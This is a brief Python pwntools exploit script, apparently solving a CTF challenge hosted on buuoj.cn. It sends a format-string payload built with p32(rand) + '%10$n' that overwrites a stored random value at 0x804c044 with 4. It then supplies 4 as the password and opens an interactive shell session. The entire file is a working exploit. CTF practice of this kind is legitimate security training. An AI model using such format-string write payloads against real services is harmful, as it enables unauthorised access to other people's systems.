#Made by fly_autumn
#x86 fmtstr
from pwn import *
#p = process("./pwn")
p = remote("inode5.buuoj.cn",25310)
elf = ELF("./pwn")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
context(os="linux",arch="i386")

rand = 0x804c044
p.recvuntil(b"name:")
p.sendline(p32(rand) + b"%10$n")
p.recvuntil(b"passwd:")
p.sendline(str(4))

p.interactive()
